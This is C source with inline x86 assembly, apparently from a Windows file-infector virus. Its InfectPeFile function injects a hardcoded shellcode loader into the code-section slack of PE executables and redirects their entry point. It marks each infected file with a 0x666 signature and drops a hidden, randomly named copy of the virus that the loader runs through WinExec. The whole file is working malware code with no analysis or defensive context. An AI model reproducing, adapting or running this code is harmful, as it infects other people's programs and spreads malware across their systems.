#include "stdafx.h"
#include "prototypes.h"

int	InfectPeFile(char FilePath[],char VirusFile[])
{

	unsigned char LoaderCode[315] =
	{
		0x60, 0x64, 0x67, 0xA1, 0x00, 0x00, 0x8B, 0x10, 0x42, 0x74, 0x04, 0x4A, 
		0x92, 0xEB, 0xF7, 0x8B, 0x40, 0x04, 0x25, 0x00, 0x00, 0xFF, 0xFF, 0x66, 
		0x81, 0x38, 0x4D, 0x5A, 0x74, 0x07, 0x2D, 0x00, 0x00, 0x01, 0x00, 0xEB,
		0xF2, 0x8B, 0xE8, 0x03, 0x40, 0x3C, 0x8B, 0x40, 0x78, 0x03, 0xC5, 0x50, 
		0x33, 0xD2, 0x8B, 0x40, 0x20, 0x03, 0xC5, 0x8B, 0x38, 0x03, 0xFD, 0x4F,
		0x47, 0xE8, 0x08, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6E, 0x45, 0x78, 0x65, 
		0x63, 0x00, 0x5E, 0xB9, 0x08, 0x00, 0x00, 0x00, 0xF3, 0xA6, 0x74, 0x09,
		0x42, 0x80, 0x3F, 0x00, 0x74, 0xE2, 0x47, 0xEB, 0xF8, 0x58, 0xD1, 0xE2, 
		0x8B, 0x58, 0x24, 0x03, 0xDD, 0x03, 0xDA, 0x66, 0x8B, 0x13, 0xC1, 0xE2, 
		0x02, 0x8B, 0x58, 0x1C, 0x03, 0xDD, 0x03, 0xDA, 0x8B, 0x1B, 0x03, 0xDD, 
		0x6A, 0x01, 0xE8, 0x0E, 0x00, 0x00, 0x00, 0x56, 0x69, 0x72, 0x75, 0x73, 
		0x46, 0x69, 0x6C, 0x65, 0x2E, 0x65, 0x78, 0x65,	0x00, 0xFF, 0xD3, 0x83, 
		0xF8, 0x1F, 0x72, 0xFB, 0x61, 0x68, 0xC1, 0x10, 0x40, 0x00, 0xC3, 
	} ;

/*
	pushad
    mov eax,fs:[0]
search_last:
	mov edx,[eax]
	inc edx
	jz found_last
	dec edx
	xchg edx,eax
	jmp search_last
found_last:
	mov eax,[eax+4]
	and eax,0ffff0000h
search_mz:
	cmp word ptr [eax],'ZM'
	jz found_mz
	sub eax,10000h
	jmp search_mz
found_mz:
	mov	ebp,eax
	add	eax,[eax + 3ch]
	mov	eax,[eax + 78h]
	add	eax,ebp					;eax - kernel32 export table
	push	eax
	xor	edx,edx
	mov	eax,[eax + 20h]
	add	eax,ebp
	mov	edi,[eax]
	add	edi,ebp					;edi - api names array
	dec	edi
NxtCmp:	inc	edi
	call	OverWC
	db	"WinExec",0
OverWC:	pop	esi
	mov	ecx,8h
	rep	cmpsb
	je	GetWC
	inc	edx
Nxt_1:	cmp	byte ptr [edi],0h
	je	NxtCmp
	inc	edi
	jmp	Nxt_1
GetWC:	pop	eax					;eax - kernel32 export table
	shl	edx,1h					;edx - GetProcAddress position
	mov	ebx,[eax + 24h]
	add	ebx,ebp
	add	ebx,edx
	mov	dx,word ptr [ebx]
	shl	edx,2h
	mov	ebx,[eax + 1ch]
	add	ebx,ebp
	add	ebx,edx
	mov	ebx,[ebx]
	add	ebx,ebp					;Winexec !
	push	1h
	call	ExeF
	db	"VirusFile.exe",0
	FileNameOffset2		equ	($-LoaderStart-13)
ExeF:	call	ebx
Punish:	cmp	eax,31
	jb	Punish
ReturnToProgram:
	popad
	push	offset Host
	HostEntry	equ	($-LoaderStart-4)
	ret

  */

	int	LoaderSize=sizeof(LoaderCode),i;

	char filename[13],CurrectDir[MAX_PATH],FullCpyPath[MAX_PATH];

	HANDLE hfile,hfilemap,hostmap;

	DWORD xseed;

	BOOL InfectSuccess=FALSE;

	hfile=CreateFile(FilePath,GENERIC_READ | GENERIC_WRITE,NULL,
		NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

	hfilemap=CreateFileMapping(hfile,NULL,PAGE_READWRITE,NULL,NULL,NULL);

	if(hfilemap==NULL)
	{
		CloseHandle(hfile);
		return 0;
	}

	hostmap=MapViewOfFile(hfilemap,FILE_MAP_ALL_ACCESS,NULL,NULL,NULL);

	if(hostmap==NULL)
	{
		CloseHandle(hfilemap);
		CloseHandle(hfile);
		return 0;
	}

	//generate random file name

	xseed=GetTickCount();

	for(i=0,filename[sizeof(filename)]=NULL;i<(sizeof(filename)-5);i++,xseed<<=i)
		filename[i]=(char)(97+(xseed % 25));

	lstrcpy(filename+(sizeof(filename)-5),".duel");

	__asm
	{
		mov		eax,[hostmap]
		cmp		word ptr [eax],'ZM'				;check mz sign
		jne		ExitCF
		mov		ecx,dword ptr [eax + 18h]		;check if relocation in mz header
		cmp		ecx,40h							;is 0x40 which is always for pe file
		jne		ExitCF
		add		eax,[eax + 3ch]
		cmp		word ptr [eax],'EP'				;check pe sign
		jne		ExitCF
	
		cmp		word ptr [eax + 08h],0666h		;already infected ?
		je		ExitCF
	
		push	eax								;save pe header offset in the stack
		mov		cx,word ptr [eax + 16h]			;get flags
		and		cx,2000h
		cmp		cx,2000h						;is dll ?
		jne		nodll							;infect only executeables
		pop		eax								;restore stack
		jmp		ExitCF
nodll:	mov		edx,[eax + 34h]
		add		edx,[eax + 28h]

		mov		dword ptr [LoaderCode+96h],edx	;setup return entry point

		lea		edi,[LoaderCode+7fh]
		lea		esi,filename
		mov		ecx,13
		rep		movsb

		movzx	ecx,word ptr [eax + 6h]			;get number of sections
		mov		ebx,[eax + 74h]
		shl		ebx,3h
		add		eax,ebx
		add		eax,78h							;goto first section header
xnexts:	mov		ebx,[eax + 24h]					;get section flags
		and		ebx,20h
		cmp		ebx,20h							;is code section ?
		je		FoundCS
		add		eax,28h
		loop	xnexts
		pop		eax								;restore stack
		jmp		ExitCF
FoundCS:mov		ebx,[eax + 24h]					;get section flags
		and		ebx,80000000h
		cmp		ebx,80000000h					;does code section writeable ?
		jne		__x1
		pop		eax								;restore stack
		jmp		ExitCF
__x1:	mov		ebx,[eax + 10h]					;get section size of raw data
		sub		ebx,[eax + 8h]	
		cmp		ebx,LoaderSize					;check for minimum loader size
		ja		____1
		pop		eax								;restore stack
		jmp		ExitCF
____1:	mov		ecx,[eax + 8h]					;get section vitrual size	
		mov		ebx,ecx							;get section virtual size
		add		ebx,[eax + 14h]					;add to it pointer raw data rva
		add		ebx,[hostmap]					;convert it to va
		
		mov		edi,ebx
		lea		esi,[LoaderCode]
		mov		ecx,LoaderSize
		rep		movsb							;inject loader
		
		pop		eax								;restore stack
	
		sub		ebx,[hostmap]
		mov		[eax + 28h],ebx					;redirect entry point	
		
		mov		word ptr [eax + 08h],0666h		;mark as infected

		mov		[InfectSuccess],TRUE
	}

ExitCF:	

	GetCurrentDirectory(MAX_PATH,CurrectDir);

	wsprintf(FullCpyPath,"%s\\%s",CurrectDir,filename);

	CopyFile(VirusFile,FullCpyPath,FALSE);

	SetFileAttributes(FullCpyPath,FILE_ATTRIBUTE_HIDDEN);
	
	UnmapViewOfFile(hostmap);
	CloseHandle(hostmap);
	CloseHandle(hfile);

	AddToLog(FilePath,Duel_Log_Executble,InfectSuccess);

	return 1;
}